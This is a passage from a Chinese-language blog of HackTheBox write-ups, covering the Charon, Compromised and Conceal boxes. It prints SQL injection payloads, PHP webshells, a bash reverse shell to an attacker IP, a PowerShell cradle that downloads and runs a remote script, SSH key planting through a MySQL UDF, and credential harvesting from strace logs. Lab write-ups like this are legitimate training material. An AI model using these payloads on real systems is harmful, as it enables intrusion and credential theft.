<p>换一下payload，from在后面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">email&#x3D;email&#x3D;evil@evil.com&#39; UNiON select 1,2,3,concat(__username_,&#39;&#x2F;&#39;, __password_, &quot;!evil@evil.com&quot;) from supercms.operators limit 1 offset 0 --+</span><br></pre></td></tr></table></figure>

<p>这样我们可以得到<code>test1/5f4dcc3b5aa765d61d8327deb882cf99</code>，尝试修改offset后发现数量好像很大，选择使用intruder爆破<code>offset</code></p>
<p><img src="/images/charon/10.png" alt="10"></p>
<p>在很多用户后可以发现</p>
<p><img src="/images/charon/11.png" alt="11"></p>
<p><code>super_cms_adm/0b0689ba94f94533400f4decd87fa260</code></p>
<p>破解md5</p>
<p><img src="/images/charon/12.png" alt="12"></p>
<p><code>super_cms_adm/tamarro</code></p>
<p>之后回到一个上传页面，页面有一个js</p>
<p><img src="/images/charon/13.png" alt="13"></p>
<p>它用来进行前端文件判断，删掉它就好了，另外还有一个CTF点就不提了</p>
<p>通过文件上传，获得shell</p>
<p><img src="/images/charon/14.png" alt="14"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Compromised</title>
    <url>/2021/06/01/HTB-Compromised/</url>
    <content><![CDATA[<h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><p><img src="/images/Compromised/1.png" alt="1"></p>
<p>首页发现web应用<code>LiteCart</code>，这是开源的:<a href="https://github.com/litecart">项目地址</a></p>
<p><img src="/images/Compromised/2.png" alt="2"></p>
<p>搜索公开漏洞，发现文件上传<code>45267.py</code>，不过需要凭据</p>
<p><img src="/images/Compromised/4.png" alt="4"></p>
<p>web目录枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">feroxbuster -u http:&#x2F;&#x2F;10.10.10.207&#x2F; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;raft-medium-directories.txt -n -f</span><br></pre></td></tr></table></figure>

<p><img src="/images/Compromised/3.png" alt="3"></p>
<p>发现backup目录，存在压缩包a.tar.gz</p>
<p><img src="/images/Compromised/5.png" alt="5"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>检查压缩包，发现只是tar</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$file a.tar.gz                                                                                                </span><br><span class="line">a.tar.gz: POSIX tar archive (GNU)</span><br><span class="line">$tar xvf a.tar.gz</span><br></pre></td></tr></table></figure>

<p>看上去是一个Web目录的备份</p>
<p><img src="/images/Compromised/6.png" alt="6"></p>
<p>查看robots.txt是否存在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$curl -s http:&#x2F;&#x2F;10.10.10.207&#x2F;shop&#x2F;robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Allow: &#x2F;</span><br><span class="line">Disallow: *&#x2F;cache&#x2F;*</span><br><span class="line">Sitemap: &#x2F;feeds&#x2F;sitemap.xml</span><br></pre></td></tr></table></figure>

<p>其中还有个Webshell文件<code>.sh.php</code>，但这个是不存在的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>在admin目录发现了<code>login.php</code>，也就是后台登陆地址</p>
<p><img src="/images/Compromised/9.png" alt="9"></p>
<p>接着搜寻<code>password</code>关键词，发现了<code>config.inc.php</code>文件</p>
<p><img src="/images/Compromised/7.png" alt="7"></p>
<p>查看得到MySQL数据库连接凭据，不确定是否为真实存在</p>
<p><img src="/images/Compromised/8.png" alt="8"></p>
<p>到这里，就需要仔细检查Web目录，看能不能找到一些硬编码的东西</p>
<p>在<code>admin/login.php</code>中发现一条注释，提示了<code>.log2301c9430d8593ae.txt</code>，看上去好像存放了登陆密码</p>
<p><img src="/images/Compromised/10.png" alt="10"></p>
<p>尝试访问该文件，得到凭据<code>admin/theNextGenSt0r3!~</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$curl -s &quot;http:&#x2F;&#x2F;10.10.10.207&#x2F;shop&#x2F;admin&#x2F;.log2301c9430d8593ae.txt&quot;</span><br><span class="line">User: admin Passwd: theNextGenSt0r3!~</span><br></pre></td></tr></table></figure>

<p>使用改凭据成功登陆后台</p>
<p>登陆后提示了异地登陆，该机器可能有其他攻击者</p>
<p><img src="/images/Compromised/11.png" alt="11"></p>
<p>使用之前的python脚本快速完成Exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python 45267.py -u admin -p &#39;theNextGenSt0r3!~&#39; -t http:&#x2F;&#x2F;10.10.10.207&#x2F;shop&#x2F;admin&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Compromised/12.png" alt="12"></p>
<p>返回了shell地址，访问为空，似乎<code>c=id</code>参数没有生效</p>
<p><img src="/images/Compromised/13.png" alt="13"></p>
<p>查看python脚本内容，代码比较简单，只是上传了简单的一句话木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php if( isset( $_REQUEST[&#39;c&#39;] ) ) &#123; system( $_REQUEST[&#39;c&#39;] . &#39; 2&gt;&amp;1&#39; ); &#125; ?&gt;</span><br></pre></td></tr></table></figure>

<p>为了定位问题，我手动上传一个phpinfo页面。注意python脚本里的Content-Type要做修改</p>
<p><img src="/images/Compromised/14.png" alt="14"></p>
<p>页面成功解析，地址在<code>http://10.10.10.207/shop/vqmod/xml/a.php</code></p>
<p><img src="/images/Compromised/15.png" alt="15"></p>
<p>查看禁用的函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$echo -n system,passthru,popen,shell_exec,proc_open,exec,fsockopen,socket_create,curl_exec,curl_multi_exec,mail,putenv,imap_open,parse_ini_file,show_source,file_put_contents,fwrite,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals |sed &#39;s&#x2F;,&#x2F;\n&#x2F;g&#39;</span><br><span class="line"></span><br><span class="line">system</span><br><span class="line">passthru</span><br><span class="line">popen</span><br><span class="line">shell_exec</span><br><span class="line">proc_open</span><br><span class="line">exec</span><br><span class="line">fsockopen</span><br><span class="line">socket_create</span><br><span class="line">curl_exec</span><br><span class="line">curl_multi_exec</span><br><span class="line">mail</span><br><span class="line">putenv</span><br><span class="line">imap_open</span><br><span class="line">parse_ini_file</span><br><span class="line">show_source</span><br><span class="line">file_put_contents</span><br><span class="line">fwrite</span><br><span class="line">pcntl_alarm</span><br><span class="line">pcntl_fork</span><br><span class="line">pcntl_waitpid</span><br><span class="line">pcntl_wait</span><br><span class="line">pcntl_wifexited</span><br><span class="line">pcntl_wifstopped</span><br><span class="line">pcntl_wifsignaled</span><br><span class="line">pcntl_wifcontinued</span><br><span class="line">pcntl_wexitstatus</span><br><span class="line">pcntl_wtermsig</span><br><span class="line">pcntl_wstopsig</span><br><span class="line">pcntl_signal</span><br><span class="line">pcntl_signal_get_handler</span><br><span class="line">pcntl_signal_dispatch</span><br><span class="line">pcntl_get_last_error</span><br><span class="line">pcntl_strerror</span><br><span class="line">pcntl_sigprocmask</span><br><span class="line">pcntl_sigwaitinfo</span><br><span class="line">pcntl_sigtimedwait</span><br><span class="line">pcntl_exec</span><br><span class="line">pcntl_getpriority</span><br><span class="line">pcntl_setpriority</span><br><span class="line">pcntl_async_signals</span><br></pre></td></tr></table></figure>

<p>除了常见的系统函数system、exec、passthru，诸如putenv、pcntl_exec、mail、fwrite这样的函数也被禁用了</p>
<h2 id="方法1-bypass-disable-functions"><a href="#方法1-bypass-disable-functions" class="headerlink" title="方法1 bypass disable_functions"></a>方法1 bypass disable_functions</h2><h3 id="chankro-失败"><a href="#chankro-失败" class="headerlink" title="chankro(失败)"></a>chankro(失败)</h3><p>chankro的使用需要编辑一个shell脚本，知道对方架构，知道文件上传后的目录位置</p>
<p>编辑shell.sh</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.12&#x2F;4444 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p>目录位置可以从PHP的SCRIPT_FILENAME处得知</p>
<p><img src="/images/Compromised/16.png" alt="16"></p>
<p>使用chankro</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python chankro.py --arch 64 --input shell.sh --output shell.php --path &#x2F;var&#x2F;www&#x2F;html&#x2F;shop&#x2F;vqmod&#x2F;xml&#x2F;</span><br></pre></td></tr></table></figure>

<p>查看代码，确实使用了mail和put_env，所以我不会尝试它</p>
<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>在Freebuf上找到了一篇<a href="https://www.freebuf.com/articles/web/258756.html">文章</a>关于绕过PHP函数的</p>
<h3 id="debug-backtrace-成功"><a href="#debug-backtrace-成功" class="headerlink" title="debug_backtrace(成功)"></a>debug_backtrace(成功)</h3><p>HackTricks上的一个<a href="https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-7.0-7.4-nix-only">文章</a>使用<code>debug_backtrace</code>进行绕过，这需要目标机器为Linux并且使用php7.0~7.4。正好目标完全符合</p>
<p>上传后，默认执行的<code>uname -a</code>成功</p>
<p><img src="/images/Compromised/17.png" alt="17"></p>
<h3 id="gc-collect-cycle-成功"><a href="#gc-collect-cycle-成功" class="headerlink" title="gc_collect_cycle(成功)"></a>gc_collect_cycle(成功)</h3><p>找到了一个<a href="https://github.com/mm0r1/exploits">项目</a>，里面使用了<code>gc_collect_cycle</code>函数进行绕过</p>
<p><img src="/images/Compromised/18.png" alt="18"></p>
<h3 id="AntSword"><a href="#AntSword" class="headerlink" title="AntSword"></a>AntSword</h3><p>AntSword有一个<a href="https://github.com/Medicean/as_bypass_php_disable_functions">bypass_php_disable_functions</a>的扩展模块。使用它可以快速完成测试</p>
<p>上传shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure>

<p>连接之后使用辅助模块</p>
<p><img src="/images/Compromised/19.png" alt="19"></p>
<p>慢慢尝试，总能找到可以绕过的，原理都一样</p>
<p><img src="/images/Compromised/20.png" alt="20"></p>
<h3 id="未完成Reverse-Shell-iptables-bypass"><a href="#未完成Reverse-Shell-iptables-bypass" class="headerlink" title="未完成Reverse_Shell(iptables bypass)"></a>未完成Reverse_Shell(iptables bypass)</h3><p>尝试了几次反弹shell都没有成功，机器上存在curl，但curl kali的80也没反应，似乎存在流量限制</p>
<p>尝试寻找iptables文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F;etc -type f |grep iptable</span><br></pre></td></tr></table></figure>

<p><img src="/images/Compromised/26.png" alt="26"></p>
<p>抓取防火墙规则文件，发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Generated by iptables-save v1.6.1 on Mon May 11 02:27:29 2020</span><br><span class="line">*filter</span><br><span class="line">:INPUT DROP [6:1032]</span><br><span class="line">:FORWARD DROP [0:0]</span><br><span class="line">:OUTPUT DROP [5:394]</span><br><span class="line">-A INPUT -i lo -j ACCEPT</span><br><span class="line">-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m tcp --dport 22 -m tcp -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m tcp --dport 80 -m tcp -j ACCEPT</span><br><span class="line">-A INPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT</span><br><span class="line">-A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT</span><br><span class="line">-A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">-A OUTPUT -p tcp -m tcp --sport 22 -m tcp -j ACCEPT</span><br><span class="line">-A OUTPUT -p tcp -m tcp --sport 80 -m tcp -j ACCEPT</span><br><span class="line">COMMIT</span><br><span class="line"># Completed on Mon May 11 02:27:29 2020</span><br></pre></td></tr></table></figure>

<p>对外访问的端口必须从本地端口22或者80端口发起连接，这是反弹shell无法完成的原因。正常反弹shell会从一个随机高端口建立连接(比如53138)，这里<code>iptables</code>是不允许的</p>
<h2 id="方法2-连接mysql"><a href="#方法2-连接mysql" class="headerlink" title="方法2 连接mysql"></a>方法2 连接mysql</h2><p>该机器限制了很多关于命令执行和写入的函数，但是没有限制文件读取和目录枚举，我们可以使用如下的php文件进行文件读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_REQUEST[&#39;file&#39;])) &#123; </span><br><span class="line">    echo file_get_contents($_REQUEST[&#39;file&#39;]);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&#39;dir&#39;])) &#123;</span><br><span class="line">    print_r(scandir($_REQUEST[&#39;dir&#39;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不过为了更好的扩展性，这里使用weevely，首先生成shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">weevely generate password123 shell.php</span><br></pre></td></tr></table></figure>

<p>上传后进行连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">weevely http:&#x2F;&#x2F;10.10.10.207&#x2F;shop&#x2F;vqmod&#x2F;xml&#x2F;shell.php password123</span><br></pre></td></tr></table></figure>

<p><img src="/images/Compromised/21.png" alt="21"></p>
<p>读取<code>/etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:file_read &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="/images/Compromised/22.png" alt="22"></p>
<p>有一件事值得注意，mysql拥有登陆后的bash shell，通常这个值应该为<code>/bin/false</code></p>
<p>由于我们之前已经获取了数据库连接凭据，也许我们能够上传php文件，接受我们输入的参数来完成sql查询</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$conn &#x3D; new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;changethis&quot;, &quot;ecom&quot;);</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">    die(&quot;Failed: &quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;Seccuess&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$result &#x3D; mysqli_query($conn, $_REQUEST[&#39;query&#39;]);</span><br><span class="line">while ($row &#x3D; $result-&gt;fetch_row()) &#123;</span><br><span class="line">    foreach ($row as $r) &#123;</span><br><span class="line">        echo $r;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看起来连接成功了</p>
<p><img src="/images/Compromised/24.png" alt="24"></p>
<p>尝试执行sql语句</p>
<p><img src="/images/Compromised/23.png" alt="23"></p>
<p>还是回到weevely进行操作，这样看起来更舒服</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@compromised:&#x2F;var&#x2F;www&#x2F;html&#x2F;shop&#x2F;vqmod&#x2F;xml PHP&gt; :sql_console -user root -passwd changethis</span><br><span class="line">root@localhost SQL&gt; show databases;</span><br><span class="line"> </span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| ecom               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>

<p>发现了现存的UDF函数，可以执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@localhost SQL&gt; select * from mysql.func;</span><br><span class="line"> </span><br><span class="line">+----------+---+-------------+----------+</span><br><span class="line">| exec_cmd | 0 | libmysql.so | function |</span><br><span class="line">+----------+---+-------------+----------+</span><br><span class="line">root@localhost SQL&gt; select exec_cmd(&quot;id&quot;);</span><br><span class="line"> </span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| uid&#x3D;111(mysql) gid&#x3D;113(mysql) groups&#x3D;113(mysql) |</span><br><span class="line">|                                                 |</span><br><span class="line">+-------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>我们可以给mysql用户写入authorized_keys</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@localhost SQL&gt; select exec_cmd(&quot;mkdir &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;.ssh&quot;);                                                                                                                         </span><br><span class="line"> </span><br><span class="line">+--+</span><br><span class="line">|  |</span><br><span class="line">+--+</span><br><span class="line">root@localhost SQL&gt; select exec_cmd(&quot;echo -n &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDlN+z24lH9+JSjrjFNH61CsTBn2wfjluBJpkeQnn9w7H0JvudEutXwcP2upNhaMuYDcuzL4cVsHYZWje3ebD8nOLD56HDnbFk23ZK1Thnh6demMhnmmk+sb9MVbQHL2DoCR7&#x2F;D0D&#x2F;s0xOUYteSoIzAxQR2ccE19FK8if4O+9Pehqm56yvaXjGoMO+Y7uIsYHtsVqwwPvIb9lcHjFikceszbbgV67ct0wrfiHvwnlJ9AyblcogDtygI1LwegjRm923EFCbEDCnSsFGHTDBf7dN&#x2F;Kfrbl&#x2F;FV&#x2F;1uo</span><br><span class="line">K3XrADO7v7jhaoufRWJnKUA+f0FD677LLMaIjZJSAO9OQQOD047Olesj5YoX4&#x2F;i8q21nl0XjR6Fi3SP9WJYb6tocsmUlfLktJLdtXvWYYKxytGJLVk2JcDdpHlxPY8UgLcGw16A8i4udQx5dt3jXS0O6z2HDv6PIRtbdjFEUWJQZiSk8vTPJMrNBniu</span><br><span class="line">iOSpRjpyPZ+nxST4j5y5h43xgKyXRTFslQ50&#x3D; root@kali&#39; &gt;&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;.ssh&#x2F;authorized_keys&quot;);</span><br><span class="line"> </span><br><span class="line">+--+</span><br><span class="line">|  |</span><br><span class="line">+--+</span><br><span class="line">root@localhost SQL&gt; select exec_cmd(&quot;chmod 600 &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;.ssh&#x2F;authorized_keys&quot;);                                                                                                      </span><br><span class="line"> </span><br><span class="line">+--+</span><br><span class="line">|  |</span><br><span class="line">+--+</span><br></pre></td></tr></table></figure>

<p>之后ssh连接即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh mysql@10.10.10.207</span><br></pre></td></tr></table></figure>

<p><img src="/images/Compromised/25.png" alt="25"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>复制linpeas文本到机器上执行，这个过程用vim会比较卡，耐心等待</p>
<p>之后发现root创建的文件，但是mysql组可读</p>
<p><img src="/images/Compromised/27.png" alt="27"></p>
<p>这个文件的内容很多，看样子是<code>strace</code>记录，<code>strace</code>也被攻击者用来作为键盘记录器:<a href="https://www.securitynik.com/2014/04/the-poor-mans-keylogger-strace.html">链接</a></p>
<p>在这个文件中，找到了疑似其他用户执行mysql时记录到的密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql@compromised:&#x2F;tmp$ cat &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;strace-log.dat |grep password</span><br><span class="line">22102 03:11:06 write(2, &quot;mysql -u root --password&#x3D;&#39;3*NLJE&quot;..., 39) &#x3D; 39</span><br><span class="line">22227 03:11:09 execve(&quot;&#x2F;usr&#x2F;bin&#x2F;mysql&quot;, [&quot;mysql&quot;, &quot;-u&quot;, &quot;root&quot;, &quot;--password&#x3D;3*NLJE32I$Fe&quot;], 0x55bc62467900 &#x2F;* 21 vars *&#x2F;) &#x3D; 0</span><br><span class="line">22227 03:11:09 write(2, &quot;[Warning] Using a password on th&quot;..., 73) &#x3D; 73</span><br><span class="line">22102 03:11:10 write(2, &quot;mysql -u root --password&#x3D;&#39;3*NLJE&quot;..., 39) &#x3D; 39</span><br><span class="line">22228 03:11:15 execve(&quot;&#x2F;usr&#x2F;bin&#x2F;mysql&quot;, [&quot;mysql&quot;, &quot;-u&quot;, &quot;root&quot;, &quot;--password&#x3D;changeme&quot;], 0x55bc62467900 &#x2F;* 21 vars *&#x2F;) &#x3D; 0</span><br><span class="line">22228 03:11:15 write(2, &quot;[Warning] Using a password on th&quot;..., 73) &#x3D; 73</span><br><span class="line">22102 03:11:16 write(2, &quot;mysql -u root --password&#x3D;&#39;change&quot;..., 35) &#x3D; 35</span><br><span class="line">22229 03:11:18 execve(&quot;&#x2F;usr&#x2F;bin&#x2F;mysql&quot;, [&quot;mysql&quot;, &quot;-u&quot;, &quot;root&quot;, &quot;--password&#x3D;changethis&quot;], 0x55bc62467900 &#x2F;* 21 vars *&#x2F;) &#x3D; 0</span><br><span class="line">22229 03:11:18 write(2, &quot;[Warning] Using a password on th&quot;..., 73) &#x3D; 73</span><br><span class="line">22232 03:11:52 openat(AT_FDCWD, &quot;&#x2F;etc&#x2F;pam.d&#x2F;common-password&quot;, O_RDONLY) &#x3D; 5</span><br><span class="line">22232 03:11:52 read(5, &quot;#\n# &#x2F;etc&#x2F;pam.d&#x2F;common-password -&quot;..., 4096) &#x3D; 1440</span><br><span class="line">22232 03:11:52 write(4, &quot;[sudo] password for sysadmin: &quot;, 30) &#x3D; 30</span><br></pre></td></tr></table></figure>

<p>尝试密码复用到用户<code>sysadmin</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh sysadmin@10.10.10.207</span><br><span class="line">3*NLJE32I$Fe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Compromised/28.png" alt="28"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Conceal</title>
    <url>/2020/06/24/HTB-Conceal/</url>
    <content><![CDATA[<h1 id="Conceal"><a href="#Conceal" class="headerlink" title="Conceal"></a>Conceal</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>第一遍nmap什么都没有扫描出来<br>接着全端口扫描也没扫出来</p>
<p>进行UDP扫描，nmapUDP扫描有点慢，先用masscan扫端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535,U:1-65535 10.10.10.116 --rate&#x3D;1000 -e tun0</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/1.jpg" alt="1"></p>
<p>扫出了端口161，snmp服务</p>
<p>nmap udp扫描非常非常慢，有时候也不准确，建议开着v参数，看端口情况</p>
<p><img src="/images/conceal/5.jpg" alt="5"></p>
<p>但我们也看到了500端口处于开放</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmpwalk -c public -v 1 10.10.10.116</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/2.jpg" alt="2"></p>
<p>枚举出了ike vpn psk <code>9C8B1A372B1878851BE2C097031B6E43</code><br>尝试破解，得到明文<code>Dudecake1!</code></p>
<p>进一步获取信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmp-check 10.10.10.116</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/3.jpg" alt="3"></p>
<p>这样扫描获取的udp端口非常精准</p>
<p>也许需要通过vpn连接，突破端口过滤</p>
<p>对端口500进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ike-scan -M 10.10.10.116</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/4.jpg" alt="4"></p>
<p>有了这些信息，开始配置vpn文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install -y strongswan</span><br></pre></td></tr></table></figure>

<p>修改<code>/etc/ipsec.secrets</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># This file holds shared secrets or RSA private keys for authentication.</span><br><span class="line"></span><br><span class="line"># RSA private key for this host, authenticating it to any other host</span><br><span class="line"># which knows the public part.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">include ipsec.d&#x2F;ipsec.nm-l2tp.secrets</span><br><span class="line"></span><br><span class="line">10.10.10.116 %any : PSK &quot;Dudecake1!&quot;</span><br></pre></td></tr></table></figure>

<p>修改<code>/etc/ipsec.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Sample VPN connections</span><br><span class="line">conn Conceal</span><br><span class="line">        authby&#x3D;psk</span><br><span class="line">        auto&#x3D;start</span><br><span class="line">        keyexchange&#x3D;ikev1</span><br><span class="line">        ike&#x3D;3des-sha1-modp1024</span><br><span class="line">        esp&#x3D;3des-sha1</span><br><span class="line">        fragmentation &#x3D; yes</span><br><span class="line">        left&#x3D;10.10.16.98</span><br><span class="line">        right&#x3D;10.10.10.116</span><br><span class="line">        type&#x3D;transport</span><br><span class="line">        rightprotoport&#x3D;tcp</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">authby 认证方式</span><br><span class="line">auto   ipsec启动时，自动执行的参数</span><br><span class="line">keyexchange 根据扫描结果(IKE CGA version 1)</span><br><span class="line">ike	    扫描结果Enc&#x3D;3DES Hash&#x3D;SHA1 Group&#x3D;2:modp1024</span><br><span class="line">esp	    扫描结果Enc&#x3D;3DES Hash&#x3D;SHA1</span><br><span class="line">fragmentation &#x3D; yes  扫描结果(IKE Fragmentation)</span><br><span class="line">fragmentaion&#x3D;yes   </span><br><span class="line">left    左侧设备，自己</span><br><span class="line">right	右侧设备，对方</span><br><span class="line">type	连接类型，transport，表示 host-to-host传输模式	</span><br><span class="line">rightprotoport 指定传输协议</span><br></pre></td></tr></table></figure>

<p>之后执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipsec stop		&#x2F;&#x2F;重启</span><br><span class="line">ipsec start --nofork</span><br></pre></td></tr></table></figure>

<p>期间可能会遇到报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key derivation for pre-shared key failed</span><br></pre></td></tr></table></figure>

<p>解决方法为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install -y libstrongswan-standard-plugins libstrongswan-extra-plugins</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/6.jpg" alt="6"></p>
<p>看到这个说明没报错，就连接成功了</p>
<p>现在我们可以对端口进行扫描<br>注意这里不能用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 10.10.10.16</span><br></pre></td></tr></table></figure>

<p>默认使用syn扫描，这样无法通过vpn进行扫描，需要使用tcp连接扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sT</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/7.jpg" alt="7"></p>
<p>这一次扫描端口开了</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>ftp允许匿名访问，登录进去</p>
<p><img src="/images/conceal/8.jpg" alt="8"></p>
<p>里面没有东西，我们先上传的文件过去</p>
<p>smb没有访客登录，没有有价值的信息</p>
<p>最后访问80，主页没有发现，运行目录扫描，发现目录<code>/upload</code></p>
<p><img src="/images/conceal/9.jpg" alt="9"></p>
<p>发现我们之前上传的文件，那利用思路就很明显了<br>不过在我之后刷新了一下页面，发现刚刚上传的文件消失了，看来上传的文件有一定的生命周期</p>
<p>msfvenom做了两个木马传上去，全都无法执行<br>换了个webshell，就可以了，<a href="https://github.com/tennc/webshell">链接</a></p>
<p><img src="/images/conceal/10.jpg" alt="10"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="potato"><a href="#potato" class="headerlink" title="potato"></a>potato</h3><p>先利用webshell获取powershell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/11.jpg" alt="11"></p>
<p>在机器上发现<code>SeImpersonatePrivilege</code>启用，准备使用<code>juicypotato</code></p>
<p>接下来传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CLSID.list</span><br><span class="line">JuicyPotato.exe</span><br><span class="line">test_clsid.bat</span><br><span class="line">evil.bat</span><br></pre></td></tr></table></figure>

<p>eveil.bat内容位反弹powershell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Powershell &quot;iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;Invoke-PowerShellTcp2.ps1&#39;)&quot;</span><br></pre></td></tr></table></figure>

<p>先运行test_clsid.bat扫描可利用的clsid</p>
<p><img src="/images/conceal/12.jpg" alt="12"></p>
